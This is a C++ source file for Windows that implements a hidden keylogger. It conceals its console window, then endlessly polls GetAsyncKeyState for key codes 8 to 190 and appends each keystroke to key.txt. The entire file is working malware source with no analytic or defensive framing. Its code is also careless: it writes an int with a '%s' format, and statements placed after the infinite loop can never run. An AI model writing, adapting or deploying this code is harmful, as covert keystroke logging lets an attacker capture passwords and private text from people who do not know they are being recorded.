#include <iostream>
#include <windows.h>
#include <winuser.h>
using namespace std;

class Key {
    public:
    int key_reader() {
        HWND Stealth;
        AllocConsole();
        Stealth = FindWindowA("ConsoleWindowClass", NULL);
        ShowWindow(Stealth,0);
        char i;
    while (1) {
        for(i = 8; i <= 190; i++) {
            if (GetAsyncKeyState(i) == -32767) {
                FILE *OUTPUT_FILE;
                OUTPUT_FILE = fopen("key.txt", "a+");
                int c = static_cast<int>(i);
                fprintf(OUTPUT_FILE, "%s", &c);
                fclose (OUTPUT_FILE);
            }
        }
    }
    system ("PAUSE");
    setlocale(LC_ALL, "rus");
    return 0;
    }
};


    